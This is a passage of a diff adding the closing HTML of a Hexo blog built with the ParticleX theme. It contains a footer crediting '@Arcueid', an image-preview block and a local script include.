+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+</body>
+</html>
